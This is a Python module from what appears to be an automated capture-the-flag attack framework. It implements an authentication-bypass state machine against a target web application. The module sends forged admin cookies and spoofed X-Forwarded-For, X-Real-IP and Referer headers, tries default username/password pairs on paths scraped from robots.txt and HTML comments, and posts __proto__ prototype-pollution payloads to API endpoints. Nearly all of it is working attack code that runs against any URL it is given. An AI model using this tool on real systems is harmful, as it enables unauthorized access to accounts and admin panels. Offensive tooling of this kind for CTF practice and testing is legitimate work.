"""Auth Logic route state machine — cookie manipulation, header spoofing, param bypass."""
from __future__ import annotations

from typing import Any, Callable, Dict, List, Optional, Tuple

import requests

from autopnex.ctf.route_state_machine import (
    RouteStateMachine,
    EvidenceScore,
    MACHINE_REGISTRY,
)


class AuthLogicMachine(RouteStateMachine):
    """State machine for authentication/authorization logic bypass.

    Covers:
    - Cookie manipulation (admin=1, role=admin, is_admin=true)
    - Header spoofing (X-Forwarded-For, Referer, X-Real-IP)
    - POST parameter type bypass (arrays, type juggling)
    - HTTP verb tampering
    """

    route = "auth_logic"

    def preconditions_met(self, blackboard_state: Dict[str, Any]) -> Tuple[bool, str]:
        # Auth logic bypass is worth trying if we see login forms or auth-related endpoints
        forms = blackboard_state.get("forms", [])
        endpoints = blackboard_state.get("key_endpoints", [])
        cookies = blackboard_state.get("cookies", [])

        for form in forms:
            if form.get("auth"):
                return True, "Auth-related form detected"

        for ep in endpoints:
            path = ep.get("path", "").lower()
            if any(kw in path for kw in ("/admin", "/login", "/auth", "/dashboard", "/flag")):
                return True, f"Auth-related endpoint: {path}"

        if cookies:
            return True, "Cookies present — may be manipulable"

        # Always worth a quick probe
        return True, "Auth logic probe is cheap"

    def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
        """Probe for auth-related endpoints."""
        return [
            ("admin_page", "/admin", None),
            ("dashboard", "/dashboard", None),
            ("flag_page", "/flag", None),
            ("admin_flag", "/admin/flag", None),
        ]

    def _send_probe(self, name: str, payload_template: str) -> requests.Response:
        """Send probe to auth-related paths."""
        return self._get(payload_template)

    def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
        text = response.text.lower() if response.text else ""
        status = response.status_code

        # 403/401 on admin pages means auth is enforced — bypass may work
        if status in (401, 403):
            return EvidenceScore("auth_logic", 0.7, probe_name,
                                 f"Auth enforced on {probe_name} (status {status})")

        # 302 redirect to login
        if status == 302:
            location = response.headers.get("Location", "").lower()
            if "login" in location:
                return EvidenceScore("auth_logic", 0.65, probe_name,
                                     "Redirect to login — auth required")

        # Page mentions admin/login
        if status == 200:
            if "admin" in text or "login" in text or "unauthorized" in text:
                return EvidenceScore("auth_logic", 0.5, probe_name,
                                     "Auth-related content on page")

        return EvidenceScore("auth_logic", 0.0, probe_name,
                             f"No auth indicators (status {status})")

    def get_exploit_steps(self) -> List[Dict[str, Any]]:
        """Auth bypass exploit steps.

        Includes both hardcoded common paths and dynamically discovered
        paths from the homepage and robots.txt.
        """
        # Discover additional paths from homepage links and robots.txt
        discovered_paths = self._discover_secret_paths()
        robots_paths = self._discover_robots_paths()

        steps = [
            # Cookie manipulation
            {
                "name": "cookie_admin_1",
                "description": "Set admin=1 cookie",
                "method": "GET",
                "path": "/admin",
                "headers": {"Cookie": "admin=1"},
                "extract_flag": True,
            },
            {
                "name": "cookie_role_admin",
                "description": "Set role=admin cookie",
                "method": "GET",
                "path": "/admin",
                "headers": {"Cookie": "role=admin"},
                "extract_flag": True,
            },
            {
                "name": "cookie_is_admin_true",
                "description": "Set is_admin=true cookie",
                "method": "GET",
                "path": "/flag",
                "headers": {"Cookie": "is_admin=true; user=admin"},
                "extract_flag": True,
            },
            # X-Forwarded-For spoofing (localhost bypass)
            {
                "name": "xff_localhost",
                "description": "X-Forwarded-For: 127.0.0.1",
                "method": "GET",
                "path": "/admin",
                "headers": {"X-Forwarded-For": "127.0.0.1"},
                "extract_flag": True,
            },
            {
                "name": "xff_localhost_flag",
                "description": "XFF 127.0.0.1 on /flag",
                "method": "GET",
                "path": "/flag",
                "headers": {"X-Forwarded-For": "127.0.0.1"},
                "extract_flag": True,
            },
            # X-Real-IP spoofing
            {
                "name": "xrealip_localhost",
                "description": "X-Real-IP: 127.0.0.1",
                "method": "GET",
                "path": "/admin",
                "headers": {"X-Real-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
                "extract_flag": True,
            },
            # Referer spoofing
            {
                "name": "referer_localhost",
                "description": "Referer: http://localhost/admin",
                "method": "GET",
                "path": "/flag",
                "headers": {"Referer": "http://localhost/admin"},
                "extract_flag": True,
            },
            # HTTP verb tampering
            {
                "name": "verb_tamper_admin",
                "description": "PUT request to /admin",
                "method": "GET",
                "path": "/admin",
                "headers": {"X-HTTP-Method-Override": "PUT"},
                "extract_flag": True,
            },
            # POST param type bypass (send as GET with admin param)
            {
                "name": "param_admin_true",
                "description": "GET /admin?admin=true",
                "method": "GET",
                "path": "/admin",
                "params": {"admin": "true"},
                "extract_flag": True,
            },
            # Combined cookie + header
            {
                "name": "combined_bypass",
                "description": "Combined cookie + XFF bypass",
                "method": "GET",
                "path": "/admin",
                "headers": {
                    "Cookie": "admin=1; role=admin; is_admin=true",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "Referer": "http://localhost/admin",
                },
                "extract_flag": True,
            },
            # --- Header spoofing on Secret.php (common CTF pattern) ---
            {
                "name": "secret_php_referer_sycsecret_xff",
                "description": "Secret.php with Referer Sycsecret + XFF",
                "method": "GET",
                "path": "/Secret.php",
                "headers": {
                    "Referer": "https://www.Sycsecret.com",
                    "X-Forwarded-For": "127.0.0.1",
                },
                "extract_flag": True,
            },
            {
                "name": "secret_php_referer_xff_xrealip",
                "description": "Secret.php with all header spoofing",
                "method": "GET",
                "path": "/Secret.php",
                "headers": {
                    "Referer": "https://www.Sycsecret.com",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "Client-IP": "127.0.0.1",
                },
                "extract_flag": True,
            },
            # Common secret/flag paths with header combos
            {
                "name": "flag_php_headers",
                "description": "/flag.php with all headers",
                "method": "GET",
                "path": "/flag.php",
                "headers": {
                    "Referer": "https://www.Sycsecret.com",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "Client-IP": "127.0.0.1",
                },
                "extract_flag": True,
            },
            {
                "name": "index_php_xff",
                "description": "/ with XFF + X-Real-IP + Client-IP",
                "method": "GET",
                "path": "/",
                "headers": {
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "Client-IP": "127.0.0.1",
                    "Referer": "https://www.Sycsecret.com",
                },
                "extract_flag": True,
            },
        ]

        # --- Default credential login on discovered paths (robots.txt + HTML) ---
        # This handles chain_info_to_auth: discover hidden panel via robots.txt,
        # then authenticate with default credentials.
        default_creds = [
            ("admin", "admin123"),
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("admin", "123456"),
        ]
        # Combine robots.txt paths and discovered paths
        all_discovered = list(set(robots_paths + discovered_paths))
        for path in all_discovered:
            # First, GET the path to check for login forms
            steps.append({
                "name": f"discover_get_{path.strip('/').replace('/', '_')[:20]}",
                "description": f"GET discovered path: {path}",
                "method": "GET",
                "path": path,
                "extract_flag": True,
            })
            # Try default credentials via POST on the path itself
            for username, password in default_creds:
                steps.append({
                    "name": f"creds_{path.strip('/').replace('/', '_')[:15]}_{username}_{password[:5]}",
                    "description": f"Default creds on {path}: {username}/{password}",
                    "method": "POST",
                    "path": path,
                    "data": f"username={username}&password={password}",
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "extract_flag": True,
                })
            # Also try POST on path/login (common pattern)
            login_path = path.rstrip("/") + "/login"
            for username, password in default_creds:
                steps.append({
                    "name": f"creds_login_{path.strip('/').replace('/', '_')[:12]}_{username}_{password[:5]}",
                    "description": f"Default creds on {login_path}: {username}/{password}",
                    "method": "POST",
                    "path": login_path,
                    "data": f"username={username}&password={password}",
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "extract_flag": True,
                })

        # Add dynamically discovered paths with header combinations
        for i, path in enumerate(discovered_paths):
            steps.append({
                "name": f"discovered_{i}_all_headers",
                "description": f"Discovered path {path} with all headers",
                "method": "GET",
                "path": path,
                "headers": {
                    "Referer": "https://www.Sycsecret.com",
                    "X-Forwarded-For": "127.0.0.1",
                    "X-Real-IP": "127.0.0.1",
                    "Client-IP": "127.0.0.1",
                },
                "extract_flag": True,
            })

        # --- Prototype pollution (Express/Node.js targets) ---
        # POST JSON with __proto__ to pollute Object.prototype, then access /admin
        proto_payloads = [
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"isAdmin": True, "role": "admin", "admin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__": {"admin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"authenticated": True, "isAdmin": True}},
        ]
        for i, payload in enumerate(proto_payloads):
            steps.append({
                "name": f"proto_pollution_config_{i}",
                "description": f"Prototype pollution: POST to /api/config",
                "method": "POST",
                "path": "/api/config",
                "json": payload,
                "headers": {"Content-Type": "application/json"},
                "extract_flag": False,
            })

        # After pollution, check admin endpoints
        for admin_path in ["/admin", "/api/admin", "/flag", "/api/flag", "/dashboard"]:
            steps.append({
                "name": f"proto_check_{admin_path.strip('/').replace('/', '_')}",
                "description": f"Check {admin_path} after prototype pollution",
                "method": "GET",
                "path": admin_path,
                "extract_flag": True,
            })

        # Also try pollution on other common merge endpoints
        for merge_path in ["/api/settings", "/api/merge", "/api/update", "/api/user"]:
            steps.append({
                "name": f"proto_merge_{merge_path.strip('/').replace('/', '_')}",
                "description": f"Prototype pollution on {merge_path}",
                "method": "POST",
                "path": merge_path,
                "json": {"__proto__": {"isAdmin": True, "role": "admin"}},
                "headers": {"Content-Type": "application/json"},
                "extract_flag": False,
            })

        # Final admin check after all pollution attempts
        steps.append({
            "name": "proto_final_admin_check",
            "description": "Final /admin check after all pollution attempts",
            "method": "GET",
            "path": "/admin",
            "extract_flag": True,
        })

        return steps

    def _discover_secret_paths(self) -> List[str]:
        """Discover secret/hidden paths from the homepage."""
        import re
        paths = []
        try:
            resp = self.session.get(self.target_url, timeout=8, allow_redirects=True)
            if resp.status_code == 200 and resp.text:
                # Extract links from href attributes
                link_pattern = re.compile(r'href=["\']([^"\']+)["\']', re.IGNORECASE)
                for match in link_pattern.finditer(resp.text):
                    link = match.group(1)
                    # Only internal links
                    if link.startswith("/") and link not in ("/", "/admin", "/flag"):
                        if link not in paths:
                            paths.append(link)
                # Extract from HTML comments (common CTF hint pattern)
                comment_pattern = re.compile(r'<!--\s*([^\s]+\.php)\s*-->', re.IGNORECASE)
                for match in comment_pattern.finditer(resp.text):
                    path = "/" + match.group(1).lstrip("/")
                    if path not in paths:
                        paths.append(path)
                # Also extract paths mentioned in comments like "Admin panel: /path"
                admin_comment_pattern = re.compile(
                    r'<!--[^>]*?(/[a-zA-Z0-9_]+(?:/[a-zA-Z0-9_]+)*)[^>]*?-->',
                    re.IGNORECASE,
                )
                for match in admin_comment_pattern.finditer(resp.text):
                    path = match.group(1)
                    if path not in paths and path not in ("/", "/admin", "/flag"):
                        paths.append(path)
        except Exception:
            pass
        return paths[:8]  # Limit to 8 discovered paths

    def _discover_robots_paths(self) -> List[str]:
        """Discover hidden paths from robots.txt Disallow entries."""
        import re
        paths = []
        try:
            resp = self.session.get(
                self.target_url + "/robots.txt", timeout=8, allow_redirects=True
            )
            if resp.status_code == 200 and resp.text:
                # Skip if response looks like HTML (catch-all page)
                if "<html" in resp.text.lower() or "<body" in resp.text.lower():
                    return paths
                # Parse Disallow entries
                for line in resp.text.splitlines():
                    line = line.strip()
                    if line.lower().startswith("disallow:"):
                        path = line.split(":", 1)[1].strip()
                        if path and path != "/" and path not in paths:
                            # Ensure path starts with /
                            if not path.startswith("/"):
                                path = "/" + path
                            paths.append(path)
        except Exception:
            pass
        return paths[:10]  # Limit to 10 paths


# Register in MACHINE_REGISTRY
MACHINE_REGISTRY["auth_logic"] = AuthLogicMachine
